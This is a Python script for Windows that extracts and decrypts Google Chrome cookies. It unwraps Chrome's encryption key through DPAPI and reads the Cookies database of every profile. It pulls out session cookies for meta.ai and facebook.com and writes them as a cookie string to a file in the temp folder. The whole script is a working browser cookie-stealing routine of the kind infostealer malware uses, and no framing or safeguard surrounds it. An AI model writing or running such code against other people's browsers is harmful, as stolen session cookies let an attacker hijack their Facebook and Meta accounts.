import os
import json
import base64
import sqlite3
import shutil
import win32crypt
from Crypto.Cipher import AES

def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.loads(f.read())
    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    encrypted_key = encrypted_key[5:]
    return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

def decrypt_value(encrypted_val, key):
    try:
        iv = encrypted_val[3:15]
        payload = encrypted_val[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(payload)[:-16].decode()
    except Exception:
        try:
            return win32crypt.CryptUnprotectData(encrypted_val, None, None, None, 0)[1].decode()
        except Exception:
            return ""

def extract_meta_cookies():
    key = get_encryption_key()
    user_data = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data")
    
    profiles = ["Default"]
    for item in os.listdir(user_data):
        if item.startswith("Profile "):
            profiles.append(item)
            
    found_cookies = {}
    for prof in profiles:
        cookie_path = os.path.join(user_data, prof, "Network", "Cookies")
        if not os.path.exists(cookie_path):
            continue
            
        temp_db = os.path.join(os.environ["TEMP"], f"chrome_cookies_{prof}.db")
        try:
            shutil.copyfile(cookie_path, temp_db)
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT host_key, name, encrypted_value FROM cookies WHERE host_key LIKE '%meta.ai%' OR host_key LIKE '%facebook.com%'")
            for host, name, enc_val in cursor.fetchall():
                val = decrypt_value(enc_val, key)
                if val:
                    found_cookies[name] = val
            conn.close()
            os.remove(temp_db)
        except Exception as e:
            pass
            
    cookie_str = "; ".join([f"{k}={v}" for k, v in found_cookies.items()])
    return cookie_str

if __name__ == "__main__":
    cookies = extract_meta_cookies()
    print(f"TOTAL_FOUND: {len(cookies)}")
    with open(os.path.join(os.environ["TEMP"], "meta_cookies.txt"), "w", encoding="utf-8") as f:
        f.write(cookies)
